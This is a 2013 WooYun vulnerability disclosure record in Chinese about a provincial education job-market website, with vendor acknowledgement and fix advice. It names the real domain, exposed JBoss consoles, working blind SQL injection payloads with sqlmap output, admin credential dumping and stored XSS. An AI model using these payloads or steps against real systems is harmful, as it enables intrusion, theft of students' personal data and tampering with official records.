{"id": 11474, "wybug_id": "wooyun-2013-024845", "wybug_title": "某省教育厅某下属网站漏洞合集，可修改上报教育部就业率，千万大学生数万就业单位个人信息泄露", "wybug_corp": "某省教育厅", "wybug_author": "hqdvista", "wybug_date": "2013-05-31 10:51", "wybug_open_date": "2013-07-15 10:51", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "注射", "后台猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-15：\t细节向公众公开  简要描述： 某省教育厅下属某网站存在多个漏洞，可修改上报教育部的就业率，获取千万大学生和数十万就业单位账号密码及资料，修改招聘会，修改offer，短信轰炸，邮件轰炸，挂马等等：只有想不到，没有做不到 详细说明：  问题网站是浙江省教育厅下属的网上就业市场www.ejobmart.cn，大概有jboss控制台泄露、sqli、xss问题首先是一个jboss console的问题http://www.ejobmart.cn/jmx-console/\n\nhttp://www.ejobmart.cn/web-console/\n\n但是从这个console不能拿到shell，msf利用失败。虽然这样还是获得了一个关键信息：管理后台的地址\n\n随后结合这两个注入点：\nwww.ejobmart.cn/workguide.html?columnid=185sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: columnid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: columnid=185 AND 2645=2645    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: columnid=185 AND 1439=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(76)||CHR(116)||CHR(109),5)---[02:26:37] [INFO] the back-end DBMS is Oracleweb application technology: Tomcat 5.0, JSP, Servlet 2.5back-end DBMS: Oracle[02:26:37] [INFO] fetching columns for table 'XT_ADMINUSER' in database 'EJOBHOME'[02:26:37] [INFO] resumed: 14[02:26:37] [INFO] retrieving the length of query output[02:26:37] [INFO] retrieved:[02:26:37] [INFO] resumed: QQ[02:26:37] [INFO] retrieving the length of query output[02:26:37] [INFO] retrieved:[02:26:37] [INFO] resumed: LOGINTIME[02:26:37] [INFO] retrieving the length of query output[02:26:37] [INFO] retrieved:[02:26:37] [INFO] resumed: LOGINID[02:26:37] [INFO] retrieving the length of query output[02:26:37] [INFO] retrieved:[02:26:37] [INFO] resumed: LOGINNAME[02:26:37] [INFO] retrieving the length of query output[02:26:37] [INFO] retrieved:[02:26:37] [INFO] resumed: PSW\n和\nhttp://www.ejobmart.cn:80/enterpriseinfo.html?unitid=CF7217F846C8ABBAE04010AC14976315sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: unitid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: unitid=CF7217F846C8ABBAE04010AC14976315' AND 2192=2192 AND 'UFPR'='UFPR---[02:24:26] [INFO] the back-end DBMS is Oracleweb application technology: Tomcat 5.0, JSP, Servlet 2.5back-end DBMS: Oracle\n然后通过猜解数据库和表结构，确定管理员表为EJ**HOME中的ADMIN****. 将数据dump下来，获得几个admin账号及各校就业处工作站的账号\n\n用一个账号登陆后台，功能还是很多的\n\n上报教育厅和教育部的地方：\n\n查询任意大学生信息\n\n\n\n各校工作站账号可在管理员控制界面操作，将学生信息导出成xls公司信息、offer信息、短信后台\n\n注意公司信息里面是可以得到md5后的hash，可用来猜解密码。\n\n\n\n邮件平台可附带附件挂马，就不截图了。最后还有几个xss问题例子：1. 留言板存储型xss\n\n\n\n2. 个人简历处存储型xss，可插入联系方式等地方，可以拿来打用人单位和管理员，拿敝校妹子做个示范\n\n\n\n   漏洞证明：  如上，就不赘述了   修复方案：  给jmx-console加访问控制，管理员用强密码另外代码需要重新review，sqli和xss不少，或者干脆用waf   版权声明：转载请注明来源 hqdvista@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-06-02 22:54 厂商回复： CNVD确认并复现所述情况(XSS盲打一般不直接复现)，转由CNCERT下发浙江分中心，由浙江分中心后续协调网站管理单位处置。按多个漏洞进行评分，rank=2+10+6 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}